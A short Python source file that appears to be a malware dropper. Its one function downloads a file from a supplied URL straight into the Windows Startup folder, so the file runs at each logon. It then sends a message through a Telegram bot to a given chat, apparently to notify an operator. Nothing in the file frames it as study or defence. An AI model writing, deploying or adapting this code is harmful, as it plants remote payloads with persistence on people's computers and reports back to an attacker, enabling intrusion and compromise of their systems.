import os
import requests


def run(url, filename, token, chat_id, text):
    startup_folder = os.path.expanduser(
        '~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    filepath = os.path.join(startup_folder, filename)
    response = requests.get(url, stream=True)
    with open(filepath, 'wb') as out_file:
        out_file.write(response.content)

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": text
    }
    requests.post(url, params=params)
